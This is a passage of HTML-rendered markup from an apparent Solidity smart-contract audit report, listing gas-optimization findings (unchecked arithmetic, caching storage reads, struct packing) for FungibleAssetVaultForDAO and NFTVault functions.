class=\"mtk1\">:         </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">answer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">latestAnswer</span><span class=\"mtk1\">();  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 oracle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 oracle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">: </span></span></span></code></pre>\n<h2 id=\"g-09-fungibleassetvaultfordao_collateralpriceusd-return-statement-should-be-unchecked\" style=\"position:relative;\"><a href=\"#g-09-fungibleassetvaultfordao_collateralpriceusd-return-statement-should-be-unchecked\" aria-label=\"g 09 fungibleassetvaultfordao_collateralpriceusd return statement should be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] <code>FungibleAssetVaultForDAO._collateralPriceUsd()</code>: return statement should be unchecked</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_collateralPriceUsd</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: whole return statement should be unchecked (obviously can&#39;t underflow/overflow here)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:                 ? </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">18</span><span class=\"mtk1\">)  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:                 : </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">);  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Due to the ternary condition and the fact that <code>int256 answer = oracle.latestAnswer();</code>, the return statement can’t underflow and should be unchecked.</p>\n<h2 id=\"g-10-fungibleassetvaultfordaodeposit-collateralasset-should-get-cached\" style=\"position:relative;\"><a href=\"#g-10-fungibleassetvaultfordaodeposit-collateralasset-should-get-cached\" aria-label=\"g 10 fungibleassetvaultfordaodeposit collateralasset should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] <code>FungibleAssetVaultForDAO.deposit()</code>: <code>collateralAsset</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WHITELISTED_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collateralAsset</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">) {  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 collateralAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_msg_value&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;non_zero_eth_value&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 collateralAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<h2 id=\"g-11-fungibleassetvaultfordaorepay-l184-should-be-unchecked-due-to-l182\" style=\"position:relative;\"><a href=\"#g-11-fungibleassetvaultfordaorepay-l184-should-be-unchecked-due-to-l182\" aria-label=\"g 11 fungibleassetvaultfordaorepay l184 should be unchecked due to l182 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] <code>FungibleAssetVaultForDAO.repay)</code>: L184 should be unchecked due to L182</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WHITELISTED_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L182)</span></span></span></code></pre>\n<h2 id=\"g-12-fungibleassetvaultfordaowithdraw-l196-should-be-unchecked-due-to-l194\" style=\"position:relative;\"><a href=\"#g-12-fungibleassetvaultfordaowithdraw-l196-should-be-unchecked-due-to-l194\" aria-label=\"g 12 fungibleassetvaultfordaowithdraw l196 should be unchecked due to l194 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] <code>FungibleAssetVaultForDAO.withdraw()</code>: L196 should be unchecked due to L194</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WHITELISTED_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">creditLimit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCreditLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L194)</span></span></span></code></pre>\n<h2 id=\"g-13-fungibleassetvaultfordaowithdraw-collateralamount-should-get-cached\" style=\"position:relative;\"><a href=\"#g-13-fungibleassetvaultfordaowithdraw-collateralamount-should-get-cached\" aria-label=\"g 13 fungibleassetvaultfordaowithdraw collateralamount should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] <code>FungibleAssetVaultForDAO.withdraw()</code>: <code>collateralAmount</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WHITELISTED_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 collateralAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">creditLimit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCreditLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD 2 collateralAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">creditLimit</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;insufficient_credit&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 3 collateralAmount (could&#39;ve used the a cached value for calculation)</span></span></span></code></pre>\n<h2 id=\"g-14-nftvault_normalizeaggregatoranswer-return-statement-should-be-unchecked\" style=\"position:relative;\"><a href=\"#g-14-nftvault_normalizeaggregatoranswer-return-statement-should-be-unchecked\" aria-label=\"g 14 nftvault_normalizeaggregatoranswer return statement should be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] <code>NFTVault._normalizeAggregatorAnswer()</code>: return statement should be unchecked</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">454</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_normalizeAggregatorAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IAggregatorV3Interface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aggregator</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">455:         </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">456:         </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">457:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">458:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">464</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: whole return statement should be unchecked (obviously can&#39;t underflow/overflow)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">465</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">466</span><span class=\"mtk1\">:                 ? </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">18</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">467</span><span class=\"mtk1\">:                 : </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">468</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-15-nftvault_calculateadditionalinterest-totaldebtamount-should-get-cached\" style=\"position:relative;\"><a href=\"#g-15-nftvault_calculateadditionalinterest-totaldebtamount-should-get-cached\" aria-label=\"g 15 nftvault_calculateadditionalinterest totaldebtamount should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-15] <code>NFTVault._calculateAdditionalInterest()</code>: <code>totalDebtAmount</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">578</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateAdditionalInterest</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">585</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalDebtAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 totalDebtAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">586</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">587</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">588</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">589</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Accrue interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">590</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interestPerYear</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalDebtAmount</span><span class=\"mtk1\"> *  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 totalDebtAmount</span></span></span></code></pre>\n<h2 id=\"g-16-nftvaultsol-struct-positionpreview-can-be-tightly-packed-to-save-1-storage-slot\" style=\"position:relative;\"><a href=\"#g-16-nftvaultsol-struct-positionpreview-can-be-tightly-packed-to-save-1-storage-slot\" aria-label=\"g 16 nftvaultsol struct positionpreview can be tightly packed to save 1 storage slot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-16] <code>NFTVault.sol</code>: <code>struct PositionPreview</code> can be tightly packed to save 1 storage slot</h2>\n<p>From (see <code>@audit</code> tags):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span 